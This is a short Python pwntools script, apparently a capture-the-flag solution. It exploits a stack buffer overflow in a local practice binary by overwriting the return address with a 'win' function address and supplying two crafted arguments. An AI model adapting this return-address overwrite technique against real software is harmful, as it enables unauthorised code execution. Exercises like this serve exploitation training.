#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./vuln_patched")

context.binary = exe


def conn():
    if True:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    ebp = 0xffffd438
    input_addr = ebp - 0x6c
    return_addr_addr = 0xffffd43c
    win_addr = 0x0804929a
    arg1_addr = ebp + 0x8
    arg2_addr = ebp + 0xc

    offset0 = (return_addr_addr - input_addr)
    payload = b"A" * offset0 
    payload += struct.pack("I", win_addr)

    payload += b"A" * 4
    payload += struct.pack("I", 0xcafef00d)
    payload += struct.pack("I", 0x0000f00d)

    r.sendline(payload)
    dump = r.recv(1024)
    print(dump)
    return


if __name__ == "__main__":

    main()
# 0x080493dd
